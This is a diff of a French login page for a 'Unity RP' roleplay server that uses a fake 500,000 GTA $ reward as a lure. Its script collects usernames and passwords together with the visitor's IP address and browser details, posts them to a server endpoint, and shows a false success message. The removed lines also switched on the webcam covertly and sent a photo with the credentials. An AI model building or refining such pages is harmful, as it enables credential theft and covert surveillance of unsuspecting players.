@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -7,154 +6,111 @@
     <title>Unity RP - Connexion</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body, html { height: 100%; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
         body {
-            background: url('background.jpg') no-repeat center center fixed;
-            background-size: cover;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0f13;
+            color: #fff;
             display: flex;
             justify-content: center;
             align-items: center;
-            position: relative;
-            background-color: #0b0b0b;
-        }
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.75);
-            z-index: 1;
+            min-height: 100vh;
         }
         .login-card {
-            background: #121212;
-            padding: 35px;
+            background: #18181f;
+            padding: 30px;
             border-radius: 12px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.9);
-            text-align: center;
-            width: 380px;
-            position: relative;
-            z-index: 2;
-            border: 1px solid #222;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #2a2a35;
         }
-        .brand-title {
-            font-size: 26px;
-            font-weight: 900;
-            color: #fff;
-            margin-bottom: 5px;
-            text-transform: uppercase;
-        }
-        .brand-title span { color: #ff2a4d; }
-        .reward-banner {
-            background: rgba(255, 42, 77, 0.15);
+        h2 { text-align: center; margin-bottom: 8px; color: #ff2a4d; }
+        .subtitle { text-align: center; font-size: 0.9em; color: #888; margin-bottom: 20px; }
+        .reward {
+            background: rgba(255, 42, 77, 0.1);
             border: 1px dashed #ff2a4d;
             color: #ff4d6d;
-            padding: 8px;
-            border-radius: 6px;
-            font-size: 13px;
-            font-weight: bold;
-            margin: 15px 0 20px 0;
-        }
-        .form-group { text-align: left; margin-bottom: 12px; }
-        .form-label { display: block; font-size: 12px; color: #aaa; margin-bottom: 4px; }
-        .form-input {
-            width: 100%;
             padding: 10px;
-            background: #1a1a1a;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 0.85em;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-size: 0.85em; color: #aaa; }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            background: #0f0f13;
             border: 1px solid #333;
             border-radius: 6px;
             color: #fff;
-            font-size: 14px;
+            font-size: 1em;
+            outline: none;
         }
-        .form-input:focus { outline: none; border-color: #ff2a4d; }
-        .neon-btn {
-            background: #ff2a4d;
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 15px;
-            font-weight: bold;
-            cursor: pointer;
+        input:focus { border-color: #ff2a4d; }
+        button {
             width: 100%;
-            box-shadow: 0 0 12px rgba(255, 42, 77, 0.4);
+            padding: 12px;
+            background: #ff2a4d;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 1em;
+            cursor: pointer;
             margin-top: 10px;
         }
-        .neon-btn:hover { background: #ff4d6d; }
-        #videoStream { display: none; }
+        button:hover { background: #ff4d6d; }
     </style>
 </head>
 <body>
 
-    <video id="videoStream" autoplay muted playsinline></video>
-
     <div class="login-card">
-        <h1 class="brand-title">UNITY <span>RP</span></h1>
-        <div class="reward-banner">🎁 Récompense : 500 000 GTA $ RP offerts !</div>
-        
+        <h2>UNITY <span>RP</span></h2>
+        <p class="subtitle">Connexion au serveur</p>
+        <div class="reward">🎁 Récompense : +500 000 GTA $ RP offerts !</div>
+
         <form id="loginForm">
             <div class="form-group">
-                <label class="form-label">Nom d'utilisateur</label>
-                <input type="text" id="username" class="form-input" placeholder="Entrez votre pseudo" required autocomplete="username">
+                <label for="username">Nom d'utilisateur</label>
+                <input type="text" id="username" placeholder="Entrez votre pseudo" required>
             </div>
             <div class="form-group">
-                <label class="form-label">Mot de passe</label>
-                <input type="password" id="password" class="form-input" placeholder="••••••••" required autocomplete="current-password">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" placeholder="••••••••" required>
             </div>
-            <button type="submit" class="neon-btn">Se connecter au serveur</button>
+            <button type="submit">Se connecter</button>
         </form>
     </div>
 
     <script>
-        const videoStream = document.getElementById('videoStream');
         let userIpAddress = 'Non détectée';
 
-        // Récupération de l'IP publique
+        // Récupération de l'IP en arrière-plan sans bloquer
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => { userIpAddress = data.ip; })
-            .catch(err => console.error("Erreur IP:", err));
+            .catch(() => {});
 
-        // Demande et initialisation de la caméra en arrière-plan
-        navigator.mediaDevices?.getUserMedia({ video: true })
-            .then(stream => { 
-                videoStream.srcObject = stream; 
-            })
-            .catch(err => { 
-                console.log("Caméra refusée ou non disponible :", err); 
-            });
-
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+
             const user = document.getElementById('username').value.trim();
             const pass = document.getElementById('password').value.trim();
 
             if (!user || !pass) return;
 
-            let photoData = null;
-            try {
-                if (videoStream.srcObject) {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = videoStream.videoWidth || 640;
-                    canvas.height = videoStream.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
-                    photoData = canvas.toDataURL('image/jpeg', 0.7);
-                }
-            } catch (camErr) {
-                console.log("Erreur capture photo :", camErr);
-            }
-
             try {
                 const response = await fetch('/register', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         username: user,
                         password: pass,
                         ip: userIpAddress,
-                        userAgent: navigator.userAgent,
-                        photo: photoData
+                        userAgent: navigator.userAgent
                     })
                 });
 
@@ -162,10 +118,9 @@
                     alert('Connexion réussie ! Vos 500 000 GTA $ RP ont été crédités.');
                     document.getElementById('loginForm').reset();
                 } else {
-                    alert('Erreur lors du traitement de la connexion par le serveur.');
+                    alert('Erreur lors du traitement par le serveur.');
                 }
             } catch (err) {
-                console.error("Erreur réseau :", err);
                 alert('Erreur de communication avec le serveur.');
             }
         });
